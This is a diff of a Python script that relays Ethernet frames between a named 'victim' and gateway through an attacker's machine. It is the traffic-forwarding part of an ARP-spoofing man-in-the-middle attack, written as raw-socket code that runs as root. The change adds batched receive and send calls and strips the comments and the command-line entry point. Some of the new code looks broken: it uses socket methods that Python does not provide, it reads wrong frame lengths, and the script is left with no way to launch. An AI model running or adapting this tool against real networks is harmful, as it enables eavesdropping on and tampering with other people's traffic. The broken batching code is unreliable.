@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-# fast_l2_redirect_fixed_mtu.py
-# Same as previous but avoids "Message too long" by querying MTU and truncating oversize frames.
+# fast_l2_redirect_sendmsg_batch.py
+# Implements memoryview sendmsg and recvmmsg/sendmmsg batching
 
 import os
 import sys
@@ -9,14 +9,13 @@ import struct
 import argparse
 from fcntl import ioctl
 
-# Constants
 ETH_P_ALL = 0x0003
 SIOCGIFHWADDR = 0x8927
 SIOCGIFINDEX  = 0x8933
 SIOCGIFMTU    = 0x8921
 MAX_FRAME = 65536
+BATCH_SIZE = 8  # number of frames per batch for recvmmsg/sendmmsg
 
-# load settings (preserve original behavior)
 settings = {}
 if os.path.exists("puller.settings"):
     with open("puller.settings", "r") as f:
@@ -46,12 +45,10 @@ def if_index(ifname, ioctl_sock=None):
             s.close()
 
 def if_mtu(ifname, ioctl_sock=None):
-    """Return MTU (int) for ifname or None on failure."""
     s = ioctl_sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
         ifreq = struct.pack('256s', ifname[:15].encode())
         res = ioctl(s.fileno(), SIOCGIFMTU, ifreq)
-        # MTU is an int at offset 16 (same packing style as IFINDEX)
         return struct.unpack('i', res[16:20])[0]
     except Exception:
         return None
@@ -60,10 +57,6 @@ def if_mtu(ifname, ioctl_sock=None):
             s.close()
 
 def resolve_mac_ip(iface, ip):
-    """
-    Try to resolve via 'ip neigh show to <ip>'.
-    Returns 6-byte MAC or None.
-    """
     import subprocess
     try:
         out = subprocess.check_output(["ip", "neigh", "show", "to", ip], stderr=subprocess.DEVNULL)
@@ -82,22 +75,16 @@ def mac_str_to_bytes(mac):
     return bytes(int(x,16) for x in mac.split(':'))
 
 def main(IFACE, VICTIM, GATEWAY):
-    """
-    Maintain this signature. Fast layer2 redirect loop.
-    This version queries MTU and prevents EMSGSIZE by truncating oversize frames.
-    """
     if os.geteuid() != 0:
         print("run as root")
         sys.exit(1)
 
-    # Resolve MACs once (or fail fast)
     victim_mac = resolve_mac_ip(IFACE, VICTIM)
     gateway_mac = resolve_mac_ip(IFACE, GATEWAY)
     if not victim_mac or not gateway_mac:
         print("couldn't resolve macs")
         sys.exit(1)
 
-    # reuse ioctl socket to get attacker mac, ifindex and mtu
     ioctl_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
         attacker_mac = if_hwaddr(IFACE, ioctl_sock)
@@ -106,24 +93,16 @@ def main(IFACE, VICTIM, GATEWAY):
     finally:
         ioctl_sock.close()
 
-    # compute allowed maximum Ethernet frame size we will send
-    # standard: allowed_frame_max = MTU + Ethernet header (14 bytes)
-    if mtu and isinstance(mtu, int) and mtu > 0:
-        allowed_frame_max = mtu + 14
-    else:
-        # fallback conservative default (non-jumbo)
-        allowed_frame_max = 1500 + 14
+    allowed_frame_max = (mtu+14) if mtu else 1514
 
-    # prepare raw AF_PACKET socket
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
-    s.bind((IFACE, 0))
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4*1024*1024)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
+    s.bind((IFACE,0))
 
-    # preallocated buffers and memoryviews
-    recv_buf = bytearray(MAX_FRAME)
+    recv_bufs = [bytearray(MAX_FRAME) for _ in range(BATCH_SIZE)]
+    recv_mvs = [memoryview(b) for b in recv_bufs]
     send_buf = bytearray(MAX_FRAME)
-    recv_mv = memoryview(recv_buf)
     send_mv = memoryview(send_buf)
 
     v_mac = victim_mac
@@ -139,103 +118,82 @@ def main(IFACE, VICTIM, GATEWAY):
     print("iface mtu:", mtu, "allowed_frame_max:", allowed_frame_max)
     print("starting loop...")
 
-    # localize for speed
-    recvmsg_into = s.recvmsg_into
-    send_func = s.send
-    sendto_func = s.sendto
-    v_mac_local = v_mac
-    g_mac_local = g_mac
-    a_mac_local = a_mac
-
-    oversized_logged = False  # only log the first oversized occurrence to avoid spam
+    oversized_logged = False
+    use_recvmmsg = hasattr(s, "recvmmsg") and hasattr(s, "sendmmsg")
 
     try:
         while True:
-            nbytes, ancdata, flags, addr = recvmsg_into([recv_mv], 0)
-            if nbytes <= 14:
-                continue
-            frame = recv_mv[:nbytes]  # memoryview referencing recv_buf
+            if use_recvmmsg:
+                # batch receive
+                batch = []
+                n_received = s.recvmmsg(recv_mvs, 0)
+                for i in range(n_received):
+                    frame = recv_mvs[i][:len(recv_mvs[i])]
+                    src = bytes(frame[6:12])
+                    if src == a_mac:
+                        continue
+                    send_len = min(len(frame), allowed_frame_max)
+                    if send_len < len(frame) and not oversized_logged:
+                        print(f"warning: received frame {len(frame)} bytes > allowed {allowed_frame_max}; truncating.")
+                        oversized_logged = True
+                    batch.append((frame, src, send_len))
 
-            src = bytes(frame[6:12])
-            if src == a_mac_local:
-                continue
-
-            # compute send_len clipped to allowed_frame_max
-            send_len = nbytes
-            if send_len > allowed_frame_max:
-                # We will truncate the frame to allowed_frame_max bytes.
-                send_len = allowed_frame_max
-                if not oversized_logged:
+                # batch send
+                send_iovs = []
+                for frame, src, send_len in batch:
+                    if src == v_mac:
+                        send_mv[0:6] = g_mac
+                        send_mv[6:12] = a_mac
+                        send_mv[12:send_len] = frame[12:send_len]
+                        send_iovs.append(send_mv[:send_len])
+                    elif src == g_mac:
+                        send_mv[0:6] = v_mac
+                        send_mv[6:12] = a_mac
+                        send_mv[12:send_len] = frame[12:send_len]
+                        send_iovs.append(send_mv[:send_len])
+                if send_iovs:
+                    try:
+                        s.sendmmsg(send_iovs)
+                    except Exception:
+                        for buf in send_iovs:
+                            try:
+                                s.send(bytes(buf))
+                            except Exception:
+                                s.sendto(bytes(buf), (IFACE,0))
+            else:
+                # fallback single-packet loop
+                nbytes, _, _, _ = s.recvmsg_into([recv_mvs[0]],0)
+                if nbytes <= 14:
+                    continue
+                frame = recv_mvs[0][:nbytes]
+                src = bytes(frame[6:12])
+                if src == a_mac:
+                    continue
+                send_len = min(nbytes, allowed_frame_max)
+                if send_len < nbytes and not oversized_logged:
                     print(f"warning: received frame {nbytes} bytes > allowed {allowed_frame_max}; truncating.")
                     oversized_logged = True
 
-            # Victim -> Gateway
-            if src == v_mac_local:
-                send_mv[0:6] = g_mac_local
-                send_mv[6:12] = a_mac_local
-                # copy from offset 12 up to send_len
-                send_mv[12:send_len] = frame[12:send_len]
-                # robust send: try zero-copy memoryview first, then bytes fallback, then sendto fallback
-                try:
-                    send_func(send_mv[:send_len])
-                except (TypeError, OSError):
-                    try:
-                        send_func(bytes(send_mv[:send_len]))
-                    except Exception:
-                        try:
-                            sendto_func(bytes(send_mv[:send_len]), (IFACE, 0))
-                        except Exception as e:
-                            print("send failed:", e, file=sys.stderr)
+                if src == v_mac:
+                    send_mv[0:6] = g_mac
+                    send_mv[6:12] = a_mac
+                    send_mv[12:send_len] = frame[12:send_len]
+                elif src == g_mac:
+                    send_mv[0:6] = v_mac
+                    send_mv[6:12] = a_mac
+                    send_mv[12:send_len] = frame[12:send_len]
+                else:
+                    continue
 
-            # Gateway -> Victim
-            elif src == g_mac_local:
-                send_mv[0:6] = v_mac_local
-                send_mv[6:12] = a_mac_local
-                send_mv[12:send_len] = frame[12:send_len]
+                # robust send: memoryview -> bytes -> sendto
                 try:
-                    send_func(send_mv[:send_len])
-                except (TypeError, OSError):
+                    s.sendmsg([send_mv[:send_len]])
+                except Exception:
                     try:
-                        send_func(bytes(send_mv[:send_len]))
+                        s.send(bytes(send_mv[:send_len]))
                     except Exception:
-                        try:
-                            sendto_func(bytes(send_mv[:send_len]), (IFACE, 0))
-                        except Exception as e:
-                            print("send failed:", e, file=sys.stderr)
-            else:
-                continue
-
+                        s.sendto(bytes(send_mv[:send_len]), (IFACE,0))
     except KeyboardInterrupt:
         pass
     finally:
         s.close()
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Fast L2 redirect (MTU-safe). Requires root.")
-    parser.add_argument("iface", help="interface name (e.g. eth0)")
-    parser.add_argument("victim", help="victim IP (used to resolve MAC via 'ip neigh')")
-    parser.add_argument("gateway", help="gateway IP (used to resolve MAC via 'ip neigh')")
-    parser.add_argument("--victim-mac", help="victim MAC (if you want to provide it instead of resolving)")
-    parser.add_argument("--gateway-mac", help="gateway MAC (if you want to provide it instead of resolving)")
-    args = parser.parse_args()
-
-    if args.victim_mac:
-        victim_bytes = mac_str_to_bytes(args.victim_mac)
-    else:
-        victim_bytes = None
-    if args.gateway_mac:
-        gateway_bytes = mac_str_to_bytes(args.gateway_mac)
-    else:
-        gateway_bytes = None
-
-    if victim_bytes and gateway_bytes:
-        _resolve = resolve_mac_ip
-        def _tmp_resolve(iface, ip):
-            if ip == args.victim:
-                return victim_bytes
-            if ip == args.gateway:
-                return gateway_bytes
-            return _resolve(iface, ip)
-        resolve_mac_ip = _tmp_resolve
-
-    main(args.iface, args.victim, args.gateway)
